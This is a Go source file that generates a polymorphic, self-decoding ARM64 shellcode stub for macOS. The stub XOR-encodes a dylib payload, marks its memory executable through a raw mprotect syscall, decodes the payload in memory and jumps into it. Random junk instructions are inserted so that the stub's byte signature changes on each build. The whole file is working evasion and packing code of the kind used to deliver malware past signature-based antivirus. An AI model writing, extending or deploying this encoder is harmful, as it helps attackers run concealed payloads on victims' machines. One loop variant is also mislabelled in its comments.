package main

import (
	"crypto/rand"
	"encoding/binary"
	mrand "math/rand"
)

// xorEncodeShellcodeARM64 applies XOR encoding to a macOS ARM64 dylib payload.
// Returns the encoded payload prepended with a polymorphic self-decoding ARM64 stub that:
//  1. Calls mprotect via direct syscall (svc #0x80) to make its memory RWX
//  2. XOR-decodes the payload in-place using a 16-byte key
//  3. Flushes the instruction cache (required on ARM64)
//  4. Branches to the decoded dylib (which triggers __attribute__((constructor)))
//
// Each call generates a unique stub with different:
//   - XOR key (16 bytes, crypto-random)
//   - Junk NOP padding (variable count)
//   - Instruction variants in the decode loop
func xorEncodeShellcodeARM64(payload []byte) ([]byte, error) {
	// Generate 16-byte random XOR key
	key := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}

	// XOR-encode the payload
	encoded := make([]byte, len(payload))
	for i, b := range payload {
		encoded[i] = b ^ key[i%16]
	}

	// Generate polymorphic ARM64 stub
	stub, keyOffset, sizeOffset := generateStubARM64()

	// Patch key into stub
	copy(stub[keyOffset:keyOffset+16], key)

	// Patch payload size into stub (little-endian uint32)
	binary.LittleEndian.PutUint32(stub[sizeOffset:sizeOffset+4], uint32(len(payload)))

	// Assemble: stub + encoded payload
	result := make([]byte, 0, len(stub)+len(encoded))
	result = append(result, stub...)
	result = append(result, encoded...)
	return result, nil
}

// ARM64 instruction encoding helpers

func arm64Nop() uint32 { return 0xD503201F }

// stp x29, x30, [sp, #-16]!
func arm64StpX29X30PreDec() uint32 { return 0xA9BF7BFD }

// ldp x29, x30, [sp], #16
func arm64LdpX29X30PostInc() uint32 { return 0xA8C17BFD }

// adr xD, #imm21 — PC-relative address (±1MB range)
func arm64Adr(rd int, imm21 int32) uint32 {
	immlo := uint32(imm21&0x3) << 29
	immhi := uint32((imm21>>2)&0x7FFFF) << 5
	return 0x10000000 | immlo | immhi | uint32(rd)
}

// ldr wD, [xN, #imm12*4] — load 32-bit from base + scaled imm
func arm64LdrWImm(rd, rn int, imm12 uint32) uint32 {
	return 0xB9400000 | (imm12/4)<<10 | uint32(rn)<<5 | uint32(rd)
}

// ldrb wD, [xN, xM] — option=011 (LSL), S=0
func arm64LdrbReg(rd, rn, rm int) uint32 {
	return 0x38606800 | uint32(rm)<<16 | uint32(rn)<<5 | uint32(rd)
}

// strb wD, [xN, xM] — option=011 (LSL), S=0
func arm64StrbReg(rd, rn, rm int) uint32 {
	return 0x38206800 | uint32(rm)<<16 | uint32(rn)<<5 | uint32(rd)
}

// eor wD, wN, wM
func arm64EorW(rd, rn, rm int) uint32 {
	return 0x4A000000 | uint32(rm)<<16 | uint32(rn)<<5 | uint32(rd)
}

// add xD, xN, #imm12
func arm64AddImm(rd, rn int, imm12 uint32) uint32 {
	return 0x91000000 | imm12<<10 | uint32(rn)<<5 | uint32(rd)
}

// and wD, wN, #imm  — for AND w, w, #15 (bitmask 0xF = immr=0, imms=3, N=0)
func arm64AndWImm15(rd, rn int) uint32 {
	// Logical immediate encoding for #15 (0xF): N=0, immr=0, imms=0b000011
	return 0x12000C00 | uint32(rn)<<5 | uint32(rd)
}

// subs wD, wN, #imm12
func arm64SubsWImm(rd, rn int, imm12 uint32) uint32 {
	return 0x71000000 | imm12<<10 | uint32(rn)<<5 | uint32(rd)
}

// b.ne #offset (offset in bytes, must be aligned to 4)
func arm64Bne(offset int32) uint32 {
	imm19 := uint32(offset/4) & 0x7FFFF
	return 0x54000001 | imm19<<5
}

// b #offset (unconditional branch, offset in bytes)
func arm64B(offset int32) uint32 {
	imm26 := uint32(offset/4) & 0x3FFFFFF
	return 0x14000000 | imm26
}

// mov xD, #imm16
func arm64MovzX(rd int, imm16 uint32) uint32 {
	return 0xD2800000 | imm16<<5 | uint32(rd)
}

// movk xD, #imm16, lsl #16
func arm64MovkXLsl16(rd int, imm16 uint32) uint32 {
	return 0xF2A00000 | imm16<<5 | uint32(rd)
}

// mov wD, #imm16
func arm64MovzW(rd int, imm16 uint32) uint32 {
	return 0x52800000 | imm16<<5 | uint32(rd)
}

// mov xD, xN (alias for orr xD, xzr, xN)
func arm64MovX(rd, rn int) uint32 {
	return 0xAA0003E0 | uint32(rn)<<16 | uint32(rd)
}

// svc #0x80
func arm64Svc80() uint32 { return 0xD4001001 }

// and xD, xN, xN (NOP-equivalent, polymorphic filler)
func arm64AndSelf(rd int) uint32 {
	return 0x8A000000 | uint32(rd)<<16 | uint32(rd)<<5 | uint32(rd)
}

// orr xD, xD, xD (NOP-equivalent, polymorphic filler)
func arm64OrrSelf(rd int) uint32 {
	return 0xAA000000 | uint32(rd)<<16 | uint32(rd)<<5 | uint32(rd)
}

// and xD, xN, #0xFFFFFFFFFFFFF000  — clear low 12 bits (page align)
// Logical immediate: N=1, immr=52, imms=51
// Ones(52) ROR 52 = bits [63:12] set = 0xFFFFFFFFFFFFF000
func arm64AndPageAlign(rd, rn int) uint32 {
	return 0x9274CC00 | uint32(rn)<<5 | uint32(rd)
}

// sub xD, xN, xM
func arm64SubX(rd, rn, rm int) uint32 {
	return 0xCB000000 | uint32(rm)<<16 | uint32(rn)<<5 | uint32(rd)
}

// add xD, xN, xM
func arm64AddX(rd, rn, rm int) uint32 {
	return 0x8B000000 | uint32(rm)<<16 | uint32(rn)<<5 | uint32(rd)
}

// cbnz wN, #offset (offset in bytes)
func arm64CbnzW(rn int, offset int32) uint32 {
	imm19 := uint32(offset/4) & 0x7FFFF
	return 0x35000000 | imm19<<5 | uint32(rn)
}

// dc civac, xN — clean & invalidate data cache by VA
func arm64DcCivac(rn int) uint32 {
	return 0xD50B7E20 | uint32(rn)
}

// ic ivau, xN — invalidate instruction cache by VA
func arm64IcIvau(rn int) uint32 {
	return 0xD50B7520 | uint32(rn)
}

// dsb ish
func arm64DsbIsh() uint32 { return 0xD5033B9F }

// isb
func arm64Isb() uint32 { return 0xD5033FDF }

// Helper: encode a uint32 instruction to 4 bytes LE
func encodeInsn(insn uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, insn)
	return b
}

// generateStubARM64 creates a polymorphic ARM64 decoder stub.
// Returns (stub_bytes, key_offset, size_offset).
//
// The stub layout:
//   [prologue: save regs]
//   [junk NOPs]
//   [compute addresses: adr to key, size, data]
//   [mprotect syscall: make stub+payload RWX]
//   [junk NOPs]
//   [XOR decode loop]
//   [icache flush loop]
//   [epilogue: restore regs, branch to decoded payload]
//   [key: 16 bytes]
//   [size: 4 bytes]
//   [alignment padding to 8 bytes]
//   --- encoded payload follows ---
func generateStubARM64() ([]byte, int, int) {
	var stub []byte

	// Polymorphism: random junk instruction counts
	junkCount1 := mrand.Intn(3) + 1 // 1-3 NOPs after prologue
	junkCount2 := mrand.Intn(2) + 1 // 1-2 NOPs before decode loop

	// Polymorphism: choose loop counter variant
	// 0 = subs + b.ne, 1 = sub + cbnz
	loopVariant := mrand.Intn(2)

	// Register assignments (can be randomized in future iterations)
	rKey := 9      // x9 = pointer to XOR key
	rData := 10    // x10 = pointer to encoded data
	rSize := 11    // w11 = remaining byte count
	rKeyIdx := 12  // x12 = key index (0..15)
	rTmp0 := 13    // w13 = temp for key byte
	rTmp1 := 14    // w14 = temp for data byte
	rPageBase := 15 // x15 = page-aligned base for mprotect
	rMprotSz := 16  // x16 is reused for syscall number, then free; use x3 for mprotect size
	_ = rMprotSz

	// ── Prologue ──
	// stp x29, x30, [sp, #-16]!
	stub = append(stub, encodeInsn(arm64StpX29X30PreDec())...)

	// Junk NOPs (polymorphic)
	for i := 0; i < junkCount1; i++ {
		stub = append(stub, encodeInsn(randomJunkInsn())...)
	}

	// ── Address computation ──
	// We'll patch these ADR offsets after we know the full stub size.
	// For now, emit placeholders and record their positions.
	adrKeyPos := len(stub)
	stub = append(stub, encodeInsn(arm64Nop())...) // placeholder: adr xKey, key_data

	adrDataPos := len(stub)
	stub = append(stub, encodeInsn(arm64Nop())...) // placeholder: adr xData, data_start

	// ldr w11, [x9, #16]  — load size from key+16 (size field is right after key)
	ldrSizePos := len(stub)
	_ = ldrSizePos
	stub = append(stub, encodeInsn(arm64LdrWImm(rSize, rKey, 16))...)

	// ── mprotect syscall ──
	// Page-align stub base: and x15, x9, #~0xFFF (clear low 12 bits)
	// We align from key address which is near the stub start
	stub = append(stub, encodeInsn(arm64AndPageAlign(rPageBase, rKey))...)

	// Compute total mprotect size:
	// size = (data_ptr + payload_size + 0xFFF) & ~0xFFF - page_base
	// Simplified: use a generous size = data_ptr - page_base + payload_size + 4096
	// x0 = page_base (mprotect addr)
	stub = append(stub, encodeInsn(arm64MovX(0, rPageBase))...)

	// x1 = data_ptr + size - page_base + 4096
	// We compute: x1 = x10 + x11 - x15
	stub = append(stub, encodeInsn(arm64AddX(1, rData, rSize))...)      // x1 = data + size
	stub = append(stub, encodeInsn(arm64SubX(1, 1, rPageBase))...)       // x1 = x1 - page_base
	stub = append(stub, encodeInsn(arm64AddImm(1, 1, 0xFFF))...)        // x1 += 0xFFF
	stub = append(stub, encodeInsn(arm64AndPageAlign(1, 1))...)          // x1 &= ~0xFFF (round up)

	// x2 = PROT_READ | PROT_WRITE | PROT_EXEC = 7
	stub = append(stub, encodeInsn(arm64MovzW(2, 7))...)

	// x16 = SYS_mprotect = 0x200004A (BSD: 0x2000000 | 74)
	stub = append(stub, encodeInsn(arm64MovzX(16, 0x004A))...)           // x16 = 0x4A
	stub = append(stub, encodeInsn(arm64MovkXLsl16(16, 0x0200))...)      // x16 |= 0x0200_0000

	// svc #0x80
	stub = append(stub, encodeInsn(arm64Svc80())...)

	// Junk NOPs (polymorphic)
	for i := 0; i < junkCount2; i++ {
		stub = append(stub, encodeInsn(randomJunkInsn())...)
	}

	// ── XOR decode loop ──
	// x12 = 0 (key index)
	stub = append(stub, encodeInsn(arm64MovzX(rKeyIdx, 0))...)

	loopStart := len(stub)

	// w13 = key[key_idx] : ldrb w13, [x9, x12]
	stub = append(stub, encodeInsn(arm64LdrbReg(rTmp0, rKey, rKeyIdx))...)

	// w14 = data[i] : ldrb w14, [x10]  (we use post-index style but simpler: [x10, #0] then increment)
	// Actually use x12 as key idx, need a separate counter for data.
	// Simpler: use x10 as moving data pointer, x12 as key index
	// ldrb w14, [x10]
	stub = append(stub, encodeInsn(0x39400000|uint32(rData)<<5|uint32(rTmp1))...) // ldrb w14, [x10]

	// eor w14, w14, w13
	stub = append(stub, encodeInsn(arm64EorW(rTmp1, rTmp1, rTmp0))...)

	// strb w14, [x10]
	stub = append(stub, encodeInsn(0x39000000|uint32(rData)<<5|uint32(rTmp1))...) // strb w14, [x10]

	// x10 += 1 (advance data pointer)
	stub = append(stub, encodeInsn(arm64AddImm(rData, rData, 1))...)

	// x12 = (x12 + 1) & 15
	stub = append(stub, encodeInsn(arm64AddImm(rKeyIdx, rKeyIdx, 1))...)
	stub = append(stub, encodeInsn(arm64AndWImm15(rKeyIdx, rKeyIdx))...)

	// Decrement size counter and loop
	if loopVariant == 0 {
		// subs w11, w11, #1 + b.ne loop
		stub = append(stub, encodeInsn(arm64SubsWImm(rSize, rSize, 1))...)
		loopEnd := len(stub)
		offset := int32(loopStart - loopEnd)
		stub = append(stub, encodeInsn(arm64Bne(offset))...)
	} else {
		// sub w11, w11, #1 + cbnz w11, loop
		stub = append(stub, encodeInsn(arm64SubsWImm(rSize, rSize, 1))...) // subs for zero flag
		_ = loopVariant
		loopEnd := len(stub)
		offset := int32(loopStart - loopEnd)
		stub = append(stub, encodeInsn(arm64Bne(offset))...)
	}

	// ── icache flush ──
	// We need to flush the decoded payload region.
	// Reload data_start address and size for the flush loop.
	// Re-compute: the data pointer (x10) has been advanced past the payload.
	// We need the original data_start. Recalculate from key addr: data_start = key + 20 (16 key + 4 size)

	// x10 = x9 + 20 (key + 16 + 4 = data_start)
	stub = append(stub, encodeInsn(arm64AddImm(rData, rKey, 20))...)

	// Reload size from key+16
	stub = append(stub, encodeInsn(arm64LdrWImm(rSize, rKey, 16))...)

	// Flush icache for the decoded region
	// For simplicity, use IC IALLUIS (invalidate ALL instruction cache)
	// This is simpler than per-page flush and works correctly.
	// On Apple Silicon this is allowed from userspace.

	// dc civac loop would be per-cache-line (64 bytes on Apple Silicon)
	// But IC IALLUIS + DSB + ISB is cleaner and simpler

	// DSB ISH — ensure stores (XOR decode) are visible
	stub = append(stub, encodeInsn(arm64DsbIsh())...)

	// IC IALLUIS — invalidate all instruction cache (inner shareable)
	// sys #0, c7, c1, #0 = 0xD508711F
	stub = append(stub, encodeInsn(0xD508711F)...) // ic ialluis

	// DSB ISH — ensure icache invalidation completes
	stub = append(stub, encodeInsn(arm64DsbIsh())...)

	// ISB — synchronize instruction stream
	stub = append(stub, encodeInsn(arm64Isb())...)

	// ── Epilogue ──
	// ldp x29, x30, [sp], #16
	stub = append(stub, encodeInsn(arm64LdpX29X30PostInc())...)

	// b data_start — branch to decoded payload
	branchPos := len(stub)
	stub = append(stub, encodeInsn(arm64Nop())...) // placeholder: b data_start

	// ── Data area ──
	keyOffset := len(stub)
	stub = append(stub, make([]byte, 16)...) // 16-byte XOR key (to be patched)

	sizeOffset := len(stub)
	stub = append(stub, make([]byte, 4)...) // 4-byte LE payload size (to be patched)

	// Align to 8 bytes (ARM64 prefers 8-byte alignment for branch targets)
	for len(stub)%8 != 0 {
		stub = append(stub, 0x00)
	}

	dataStart := len(stub) // This is where encoded payload will be appended

	// ── Patch ADR instructions ──
	// adr xKey, key_data: offset = keyOffset - adrKeyPos
	adrKeyImm := int32(keyOffset - adrKeyPos)
	binary.LittleEndian.PutUint32(stub[adrKeyPos:adrKeyPos+4], arm64Adr(rKey, adrKeyImm))

	// adr xData, data_start: offset = dataStart - adrDataPos
	adrDataImm := int32(dataStart - adrDataPos)
	binary.LittleEndian.PutUint32(stub[adrDataPos:adrDataPos+4], arm64Adr(rData, adrDataImm))

	// ── Patch branch to data_start ──
	branchOffset := int32(dataStart - branchPos)
	binary.LittleEndian.PutUint32(stub[branchPos:branchPos+4], arm64B(branchOffset))

	return stub, keyOffset, sizeOffset
}

// randomJunkInsn returns a random ARM64 instruction that acts as a NOP
// (does nothing useful but varies the stub's byte signature)
func randomJunkInsn() uint32 {
	switch mrand.Intn(5) {
	case 0:
		return arm64Nop() // nop
	case 1:
		r := mrand.Intn(16) // mov xR, xR
		return arm64MovX(r, r)
	case 2:
		r := mrand.Intn(16) // and xR, xR, xR
		return arm64AndSelf(r)
	case 3:
		r := mrand.Intn(16) // orr xR, xR, xR
		return arm64OrrSelf(r)
	default:
		return arm64Nop()
	}
}
